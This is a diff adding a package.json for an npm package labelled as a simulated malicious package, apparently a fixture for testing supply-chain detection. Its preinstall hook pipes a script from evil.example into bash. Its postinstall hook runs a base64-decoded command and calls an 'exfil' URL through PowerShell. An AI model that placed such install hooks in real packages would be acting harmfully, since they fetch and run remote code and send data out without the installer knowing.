@@ -1,0 +1,10 @@
+{
+    "name": "malicious-npm-package",
+    "version": "1.0.0",
+    "description": "Simulated malicious npm package using postinstall hook",
+    "scripts": {
+        "preinstall": "curl -s https://evil.example/setup.sh | bash",
+        "postinstall": "echo aGVsbG8= | base64 --decode | sh && powershell -Command \"Invoke-WebRequest https://evil.example/exfil\"",
+        "test": "jest"
+    }
+}
